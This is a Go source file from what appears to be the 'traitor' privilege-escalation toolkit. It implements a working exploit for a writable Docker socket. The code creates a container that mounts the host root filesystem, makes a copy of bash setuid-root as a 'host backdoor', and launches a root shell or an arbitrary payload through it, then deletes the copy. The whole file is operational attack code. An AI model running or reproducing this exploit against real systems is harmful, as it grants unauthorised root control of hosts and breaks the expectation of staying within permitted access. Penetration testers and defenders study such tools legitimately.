package exploits

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"github.com/liamg/traitor/pkg/payloads"

	"github.com/liamg/traitor/internal/logger"

	"github.com/liamg/traitor/pkg/state"
)

type writeableDockerSocketExploit struct {
	sockPath     string
	defaultImage string
	client       *http.Client
}

func NewWriteableDockerSocketExploit() *writeableDockerSocketExploit {
	exp := &writeableDockerSocketExploit{
		sockPath:     "/var/run/docker.sock",
		defaultImage: "alpine",
	}
	exp.client = &http.Client{
		Transport: &http.Transport{
			DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {
				return net.Dial("unix", exp.sockPath)
			},
		},
		Timeout: time.Second * 10,
	}
	return exp
}

func init() {
	register("docker:writeable-socket", SpeedFast, NewWriteableDockerSocketExploit())
}

func (v *writeableDockerSocketExploit) IsVulnerable(_ context.Context, _ *state.State, log logger.Logger) bool {
	if syscall.Access(v.sockPath, syscall.O_RDWR) != nil {
		return false
	}

	log.Printf("Docker socket at %s is writeable!", v.sockPath)
	return true
}

func (v *writeableDockerSocketExploit) Shell(ctx context.Context, s *state.State, log logger.Logger) error {
	return v.Exploit(ctx, s, log, payloads.Default)
}

func (v *writeableDockerSocketExploit) Exploit(ctx context.Context, s *state.State, log logger.Logger, payload payloads.Payload) error {

	log.Printf("Attempting to download image...")
	if _, err := v.client.Post(
		fmt.Sprintf("http://localhost/images/create?fromImage=%s&tag=latest", v.defaultImage),
		"application/json",
		nil,
	); err != nil {

		log.Printf("Download failed, looking for local images instead...")

		// we can't download alpine, look at existing images and try to use those
		images, err := v.listLocalImages()
		if err != nil {
			return err
		}
		for _, image := range images {
			if err := v.exploitWithImage(image, payload, log); err != nil {
				log.Printf("Exploit failed with image '%s'", image)
				continue
			} else {
				return nil
			}
		}

		return fmt.Errorf("no exploitable local images found")
	}

	return v.exploitWithImage(v.defaultImage, payload, log)
}

func (v *writeableDockerSocketExploit) listLocalImages() ([]string, error) {
	return nil, nil
}

func (v *writeableDockerSocketExploit) exploitWithImage(image string, payload payloads.Payload, log logger.Logger) error {

	log.Printf("Planting host backdoor...")
	file, err := ioutil.TempFile(os.TempDir(), "tmp")
	if err != nil {
		return err
	}
	path := file.Name()

	input, err := ioutil.ReadFile("/bin/bash")
	if err != nil {
		return err
	}

	if _, err := file.Write(input); err != nil {
		return err
	}
	if err := file.Close(); err != nil {
		return err
	}

	if err := os.Chmod(path, 0770); err != nil {
		return err
	}

	log.Printf("Creating '%s' container...", image)
	creationData := fmt.Sprintf(`
{"Image":"%s","Cmd":["sh", "-c", "chown root /host_root%s && chmod +s /host_root%[1]s"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}
`, v.defaultImage, path)
	resp, err := v.client.Post("http://localhost/containers/create", "application/json", strings.NewReader(creationData))
	if err != nil {
		return err
	}

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	container := struct {
		ID string `json:"Id"`
	}{}
	if err := json.Unmarshal(data, &container); err != nil {
		return err
	}

	log.Printf("Starting container %s...", container.ID)
	if _, err := v.client.Post(fmt.Sprintf("http://localhost/containers/%s/start", container.ID), "application/json", nil); err != nil {
		return err
	}

	log.Printf("Waiting for guest to apply setuid to backdoor...")
	if _, err := v.client.Post(fmt.Sprintf("http://localhost/containers/%s/wait", container.ID), "application/json", nil); err != nil {
		return err
	}

	log.Printf("Checking permissions...")
	info, err := os.Stat(path)
	if err != nil {
		return err
	}
	if info.Mode()&os.ModeSetuid == 0 {
		return fmt.Errorf("setuid is not set")
	}

	log.Printf("Starting shell via backdoor...")
	cmd := exec.Cmd{
		Path:   path,
		Args:   []string{path, "-p"},
		Env:    os.Environ(),
		Stdin:  os.Stdin,
		Stdout: os.Stdout,
		Stderr: os.Stderr,
	}
	if payload != "" {
		cmd.Args = append(cmd.Args, "-c", string(payload))
	}
	if err := cmd.Start(); err != nil {
		return err
	}

	log.Printf("Removing backdoor from host...")
	if err := (&exec.Cmd{
		Path:   path,
		Args:   []string{path, "-p", "-c", fmt.Sprintf("rm -f '%s'", path)},
		Env:    os.Environ(),
		Stdin:  os.Stdin,
		Stdout: os.Stdout,
		Stderr: os.Stderr,
	}).Run(); err != nil {
		return err
	}

	if payload == "" {
		log.Printf("Dropping you into a shell...")
	} else {
		log.Printf("Running payload...")
	}
	return cmd.Wait()
}
